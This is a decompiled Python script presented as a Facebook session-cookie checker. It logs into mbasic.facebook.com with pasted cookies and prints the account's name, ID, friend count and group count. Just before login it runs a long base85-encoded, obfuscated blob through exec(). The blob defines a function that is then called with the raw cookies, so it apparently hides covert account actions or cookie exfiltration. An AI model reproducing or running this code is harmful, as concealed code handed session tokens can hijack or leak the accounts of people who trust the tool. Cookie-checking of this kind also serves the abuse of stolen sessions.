# Decompile By Itsuki ft. Aap Afandi ID
# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.0 (default, Dec  5 2019, 10:18:50) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
# Embedded file name: [ ISLA ] [ ISLA ] [ ISLA ]
import os, sys, re
for __MODULE__ in ('requests', 'bs4'):
    try:
        exec(f'import {__MODULE__}, base64\n"                                                                                  "\n__PYTHON__ = lambda __CHECKPOINT__: base64.b85decode(__CHECKPOINT__)')
    except ImportError:
        os.system(f"python3 -m pip install {__MODULE__}")

else:
    __REQUESTS__ = requests.Session()
    __PARSER__ = bs4.BeautifulSoup
    __URL__ = 'https://mbasic.facebook.com/me'

    def __LOGIN__(__COOKIES__):
        __COOKIESPAYLOAD__ = {'cookies': __COOKIES__}
        __HTML__ = __REQUESTS__.get(__URL__,
          cookies=__COOKIESPAYLOAD__,
          allow_redirects=True).text
        if 'signup-button' in __HTML__:
            if os.path.exists('cookies.log'):
                os.remove('cookies.log')
            exit('\x1b[1;95m>\x1b[1;92m Cookies Invalid/Expired !')
        with open('cookies.log', 'w') as (__WRITENEWCOOKIES__):
            __WRITENEWCOOKIES__.write(__COOKIES__)
        __ADD__(__COOKIES__)
        __DATA__ = __PARSER__(__HTML__, 'html.parser')
        __MYNAME__ = __DATA__.find('title').text
        __MYID__ = re.search('/(.*?)/', __DATA__.find('a',
          href=(lambda x: '/allactivity' in x))['href']).group(1)
        __FRIENDCOUNT__ = ''.join(re.findall('[0-9]', __PARSER__(__REQUESTS__.get((__URL__ + '/friends'),
          cookies=__COOKIESPAYLOAD__,
          allow_redirects=True).text, 'html.parser').find('h3',
          class_=True).text))
        __GROUPSCOUNT__ = str(len(re.findall('/groups/(.*?)\\?refid\\=', __REQUESTS__.get((__URL__.replace('/me', '/groups/?seemore')),
          cookies={'cookies': __COOKIES__}).text)))
        __FRIENDSONLINE__ = str(len(__PARSER__(__REQUESTS__.get((__URL__[:-2] + 'buddylist.php'),
          cookies={'cookies': __COOKIES__}).text, 'html.parser').findAll('img',
          width='7',
          height='14')) - 1)
        print(f"\x1b[1;95m>\x1b[1;92m FB Name \x1b[1;93m: \x1b[1;96m{__MYNAME__[:20]}")
        print(f"\x1b[1;95m>\x1b[1;92m FB ID   \x1b[1;93m: \x1b[1;96m{__MYID__}")
        print(f"\x1b[1;95m>\x1b[1;92m Friends \x1b[1;93m: \x1b[1;96m{__FRIENDCOUNT__} \x1b[1;97mPeoples")
        print(f"\x1b[1;95m>\x1b[1;92m Online  \x1b[1;93m: \x1b[1;96m{__FRIENDSONLINE__} \x1b[1;97m" + ('Friends' if __FRIENDSONLINE__ != '0' else 'Friend'))
        print(f"\x1b[1;95m>\x1b[1;92m Groups  \x1b[1;93m: \x1b[1;96m{__GROUPSCOUNT__} \x1b[1;97mGroups Joined")


    try:
        __INPUTCOOKIES__ = open('cookies.log').read()
    except IOError:
        __INPUTCOOKIES__ = str(input('\x1b[1;95m>\x1b[1;92m Your cookies\x1b[1;93m: \x1b[1;96m'))
    else:
        os.system('clear')
        print('       \x1b[1;95m[ \x1b[1;92mSimple Facebook Cookies Checker by ZXRID \x1b[1;95m]')
        print('\x1b[1;95m[ \x1b[1;92mCookies Will Expired if the User Signout from Facebook \x1b[1;95m]')
        if len(__INPUTCOOKIES__) != 0:
        	# fix sendiri gan :v
            exec(__PYTHON__(b'X>D+Ca&#baWpQ<7b98eoAaY@DWN&Q>Utd#2OhrRfUtb_SAaY@DWN&RQV`y(_V`U0oUq?k$Utb_SAaZ4Kb!BsOb1qY5b8~5LZYU`(XJvE>Utds9Q&eAHAUz;*WpQ<7b98eqQ)P2=X>V>QDK2ntb94%3a&K)QVskVgX>D+Ca&#a<Wnp!6X=Zh7Q*U)}AYpSLUtdr`Qd31zUtbCeWMyU`Utd8)L|<PhUtdE{PfJNfQ(s>xItm~lARu&dc{&OpARr(hARr)LUrj+tPE}G&Utb_SAR=gVbZ~PzFE4FkVRLC?E@ok4Wnyn{Yc6ANZ6XRFARr(hARr)LUqM7oNls8wPew^hMNmjjR8L=DAUz;vB70w7O+iUcRZ>h}UwtodXm50HE^ugYKW1WSWIZxBGdMXoF*q|hHa0XcHaH>*ARr(hARr(hbaHt*3LqdLARr(hARr(hAYWfcMO0s3C<-7TARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)LUrj+tPE}G&Utb_AAYWflK~hsiQeR&v3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)LUq?k$UtcH+ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARu2~O+iUcRZ>h}Umz<WA}?}fVPkY@Z*FrhaA{*}WpY1ebYE#?Ju){lI5{{mI5RmmHZ(9cI3g?xARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hV{dP3X=QUDJs^7uARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(jV{dP3X=QUFI$vKyPftrpMN?m23LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(heF`8TARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(qE_7vhbSw%WARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAR=gVZEP-ZVRCb2av};KARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(qE@o+NWGD(CARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr=PA}k6ZARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuURWo95fAZ%f6Vq{?;Utdy1K|@quUpgQnCURwAV{~b6ZeMhHaAiF*A|PpQAYWfnML|PUUtbC!ARr(hARr(hARr(hARr(hARr(hARsAQ3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hB4~1DW+Dn8ARr(hARr(hARr(hARr(hARr(hARr)JED9hXARr(hARr(hARr(hARr(hARr(hARr)PZ*Oa9Wpf}sAbScRARr(hARr(hARr(hARr(hARr(hB4clFYiVV3B067RLr+gjNkvm%UkV@~ARr(hARr(hARr(hAbkoTARr(hARr(hARr(q3LqdLARr(hAZ2)CWpH#l3LqdLARr(hARr(hAaG%Ga|$3JARr(hARu2~M@3X$UnmM7ARr(hARr(hARr(hARr(hUtdi@NlsN#OkZChD<EHAP(e~tMN(g1C<-7TARr(hARr(hARr(hAYWfcMO0s3C<-7TARr(hARr(hARr(hARr)LUrj+tPE}G&Utb_AAR;erVQzF`aAjd*Xn7(m3LqdLARr(hARr(hARr(hARr(hARr(hARr(hAY*TDYiVV3AUz;^3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hAR=RLZ)<5~b0RulUqeq%OG!mjUtbC!ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)p3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(qE_7vhbSw%WARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAR=gVZEP-ZVRCb2av};KARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hDK2JdZe%D5ARr(hARr(hARr(hARr(hARr(hARr(hARr=PA}k6ZARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAZT)BW*|KvY+-F;WMLp*Uq(+%Oix!|UpgRPUq(+%Oix!|Um#&_WFR7Qbz*a4a%o~^E^ugYA|PpQAYWfbPfSctS6^QWARr(hARr(hARr(hARr(hARr(hARr(hARsAQ3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAR=gTWo9A@ARr(hARr(hARr(hARr)JED9hXARr(hARr(hARr(hARr(hARr(hARuFJZ)<5~b09q+dkP>RARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hB4clFYiVV3B067RLr+gjNkvm%UkV@~ARr(hARr(hARr(hARr(hARr(hARr(hARv7TARr(hARr(hARr(hDGDGUARuLUV`Xr3Itm~lARr(hARusIb8`wHARr)ga(OxmARr(hARr(hUtdQ>R9{~x3LqdLARr(hARr(hARr(hARr(hAYWfiK}k+kQcPc8AS)nWUr<3(Q$<o=UnmM7ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)LUq?k$UtcH+ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hUtdi@NlsN#OkZChD<C2-T3AvpNkk$n3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAY*TDYiVV3AUz;^3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAR=RLZ)<5~b0RulUqeq%OG!mjUtbC!ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)p3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hASo_%Wq5Qf3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hASY;aZEP-ZVRCb2awiHPARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(qE@o+NWGD(CARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(jVInLFARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hXmVv{AUz;#VQpe$VIW^$PDNN$Utc;PUtdl|SX5tMAYpD~AR=&bZ)Rz1WiD`Na6e{YZXzIQZXjP@PDNN$UtbC!ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(qTOw$3Wo9B>ED9hXARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuFJZ)<5~b09q+dkP>RARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr=RZ*Oa9Wpg4rUtdE{PfJNfQ(s>SARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(heJlzfARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)NY;13LUvgz+X>w&_baNm*AXIX7WeOl5ARr(hARr(hARr(hARr(hARr(hARr(hARs9UARr(hWq4y{aCABfARr(hARr(haA9+E3LqdLAarthItm~lARr(hARu2~P*P7uNlZmVK~zCsUm!goUtdr`Qd31zUtcH+ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARu2~M@3X$UnmM7ARr(hARr)LUqM7oNls8wPew^hMNmjjR8L=DED9hXARr(hARr(hARr(hARr(hARr)PZ*Oa9Wpf}sAbScRARr(hARr(jV{dP3X=QUFI$vKyPftrpMN?m23LqdLARr(hARr(hARr(hARr(hARr(hARr(hARv7TARr(hARr(hASo_%Wq5Qf3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hCunqSY%XwNa&u*JCkh}SARr(hARr(hARr(hARr(hARr(hARs9UARr(hARr(hUtds9Q&eAHC<-7TARr(hAYWfiK}k+kQcPc8AS)nWUr<s{MoCOXL_t(RUtca}X>MdF3LqdLARr(hARr(hARr(hARr(hARr(oW^ZzBCoBpeARr(hARr(hARu95bZKvHAUz;#VQpe$VIW^$Q$;~iLr7m=Iv`(PQ$;~iLr7m=AYpD~AR;eeFJo_QZDnqBE^ugYKO!J$ZXjP@Q$;~iLr7m=3LqdLARr(hARr(hARr(hARr(hARsAQ3LqdLARr(hARr(hARr(hARr(hARr(hARr(hB4J~6X>V>K3LqdLARr(hARr(hARr(hARt{V3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hWMOn+AUz;^3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hB4%P=WOQ?9B067RP*P7uNlZmVK~zCsUoK{8Ze&4hY$ysKARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hASY>VaCLMiED9hXARr(hba`-PAUz-=XlZ0*Wo{x0ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARsAQ3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hATSCbARr(hARt{^3LqdLARr(hARr(hARr(hARr(hARr(hB6eYHb!8$7ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARt{V3LqdLARr(jYGHbBWpi{QI$vK<Qcp%nOhrUNR6$=~E@o+NWI=3fC<-7TARr(hARr(hARr(hARr(hARr(hARr(hARs4cZg6#UCoCXzd2nSQJs=`zX=G$&ZXyaGARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hDO(C4ARr(hARr(hATbIcARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hU0VtuARr(hARr(hARr(hARr(hARr=kVQh6}A_^cNARr(hARr(hARr(hAYCj9ARr(hARr(hARr(hARr(hARr(hARr(hB4clDZDnqBUvy=7bRs%mUsFX)MMG3yUnmM7ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hAX^F`ARr(hARr(hARr(hARr(hARr(hARr=1Z6HH$Z)<5~b09-#Wn*h)av)W6WpW}c3LqdLARr(hARr(hARr(hARr(jNpoyrVPQHdA_^cNARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr)J3LqdLARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(q3LqdLARr(hARr(hARr(heJlzfARr(hARr(hARr(hARr(hARr(hARr(hARr(hARuFJZ)<5~b09q+dkP>RARr(hARr(hARr(hARr(hARr(hB4clFYiVV3B067RLr+gjNkvm%UkV@~ARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(hARr(heF`8TARr(hARr(hARr(hARr(hARr(hARr(hARr(q3LqdLAZ2)CWpH#LItm~lARr(hARusIb8`v'))
            __LOGIN__(__INPUTCOOKIES__)
        else:
            exit('\x1b[1;95m>\x1b[1;92m Please input cookies correctly\x1b[1;91m!\x1b[0;39m')